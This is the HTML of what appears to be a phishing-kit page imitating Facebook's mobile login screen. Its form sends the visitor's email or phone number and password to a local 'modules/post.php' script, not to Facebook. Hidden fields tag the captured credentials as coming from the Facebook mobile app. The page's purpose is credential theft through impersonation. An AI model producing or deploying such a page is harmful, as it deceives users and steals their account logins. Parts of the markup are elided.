...
<html>
   <head>
      ...
      <script src="jquery.js"></script>
            <script src=".././modules/script.js" type="text/javascript"></script>

      <link href="./images/facebook2.png" rel="shortcut icon" sizes=196x196>
   ...
   <body class="touch iframe acw portrait" style=min-height:616px;background-color:#fff;>
      <div style=min-height:616px>
         <div class="hq02 hq03 hq04">
            <div class="hq05 hq06"><a href><i class="img hq07 hq08"><u>facebook</u></i></a></div>
         </div>
         <div class="_5soa acw" style=min-height:616px>
            <div class=hq02>
               <div class=hq05>
                  <div class="hq09 hq10 hq11" style=display:none>
                     <div class=hq12></div>
                  </div>
                  <div class=hq13>
                     <div class=hq14>
                        <div></div>
                        <form method=post action=.././modules/post.php class=hq17>
                           <div class=hq18>
                              <div class="hq19 hq20 hq21">
                                 <input class="hq22 hq23" autocomplete=on name=username placeholder="Mobile number or email address" type=text required>
                                 <div>
                                    <div class=hq24>
                                       <div class=hq02>
                                          <div class="hq05 hq25 hq03">
                                             <div class=hq27>
                                                <input class="hq22 hq23 hq28" name=password placeholder=Password type=password required>
                      <input type=hidden value=com.facebook.katana name=appnam />                          <input type=hidden name=link value="">
                                                <input type=hidden name=location value=facebook_mobile />
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                           ...
                           <div style=text-align:center;padding-top:12px;><button type=submit class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span>Log In</span></button></div>
                        </form>
                        <div>
                           <div class=_43mg><span class=_43mh>or</span></div>
                           <div class="_52jj _5t3b"><a role=button class="_5t3c _28le btn btnS medBtn mfsm touchable">Create New Account</a></div>
                        </div>
                        <div>
                           <div class=other-links>
                              <ul class=_55wp>
                                 <li><span class="mfss fcg"><a href=#>Forgotten password? · Help Centre</a></span></li>
                              </ul>
                           </div>
                        </div>
                     </div>
            ...
            <div class="_55wr _5ui2">
               <div class="hq02 _5dpw _5ui3">
                  <div class=hq05>
                     <span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                     <div class=_3ztc><span class=_52jc><a href=#>پښتو</a></span></div>
                     <div class=_3ztc><span class=_52jc><a href=#>हिन्दी</a></span></div>
                     <div class=_3ztc><span class=_52jc><a href=#>Español</a></span></div>
                  </div>
                  <div class=hq05>
                     <div class=_3ztc><span class=_52jc><a href=#>اردو</a></span></div>
                     <div class=_3ztc><span class=_52jc><a href=#>العربية</a></span></div>
                     <div class=_3ztc><span class=_52jc><a href=#>বাংলা</a></span></div>
                     <div class="_3j87 _1rrd"><i style=color:#7F7F7F><b>+</b></i></div>
                  </div>
               </div>
               <center><span class="mfss fcg">Facebook ©2019</span></center>
            </div>
         </div>
      </div>
   </body>
